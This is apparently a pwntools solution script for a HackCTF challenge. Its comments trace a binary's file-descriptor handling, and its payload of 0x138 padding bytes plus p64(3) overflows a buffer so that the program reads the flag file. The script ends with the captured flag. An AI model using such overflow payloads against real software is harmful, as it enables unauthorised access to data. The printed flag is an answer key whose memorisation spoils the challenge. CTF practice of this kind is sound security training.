from pwn import * 

#64bit binay.
# repeated rdi+0x8 makes rdi-0x8 should same with 0x0 
# in take input 0x4009c9, make file named top_secret
# in  0x400a63, recv input to 0x6ccd60.
# if input aaaa, func 0x40eac0 make program exited. 
# func 0x40e990 take param 0x6CA0A0 -> 0x6cc160
# 0x43ed20 = exit . routine 0x40ea2c cmp rbp with 0x4be6e0
# in routine 0x40e9b1 , rbp+0x0 => r13(0x6cc160) = 0, 

#top_secret's file descriptor has saved on 0x6cce98 = 4. 
#and after input, read file stream and write strings.
#and flag's file descriptor is 3, it didnt saved anywhere.
#so, if i qchanged 0x6cce90 = 3, read function will be read file "flag"
#in routine 0x04009C9 func call open func and std input. 
#at 0x400A7A, call read function .  
#p = process("./js")
p = remote("ctf.j0n9hyun.xyz",3031)
pause()
payload = "a"*0x138+p64(3)
p.recvuntil("name:")

p.sendline(payload)
p.interactive()
#HackCTF{ez_fd_0v4rwr1t4}